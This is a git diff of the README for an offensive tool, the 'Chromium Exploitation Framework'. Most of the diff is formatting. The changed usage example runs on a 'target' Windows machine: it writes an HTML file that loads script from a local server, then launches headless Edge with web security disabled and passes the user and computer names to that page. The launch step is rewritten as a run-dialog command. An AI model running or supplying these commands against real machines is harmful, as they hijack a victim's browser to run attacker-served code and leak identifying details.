@@ -1,15 +1,15 @@
-# CrEF - Chromium Exploitation Framework
-
 <div align="center">
+	<h1>CrEF - Chromium Exploitation Framework</h1>
 	<img src="./assets/CrEF-logo.png" alt="CrEF-logo" title="CrEF-logo" />
+</div>
 
 ---
-
-</div>
 
 > **Author**::      TW-D
 >
 > **Version**::     1.0.0
+
+---
 
 ## DESCRIPTION
 
@@ -62,7 +62,7 @@ After renaming the directory "./www/**data-U2lsZW5jZSBpcyBnb2xkZW4K**/" and star
 ```batch
 C:\Users\target> ECHO ^<body^>^<script src="http://127.0.0.1:8000/index.js"^>^</script^> > %TMP%\x.html
 
-C:\Users\target> msedge --disable-web-security --headless --no-first-run --user-data-dir="%TMP%" "file:///%TMP%\x.html?u=%USERNAME%&c=%COMPUTERNAME%"
+[WINDOWS + r] msedge --disable-web-security --headless --no-first-run --user-data-dir="%TMP%" "file:///%TMP%\x.html?u=%USERNAME%&c=%COMPUTERNAME%"
 ```
 
 >
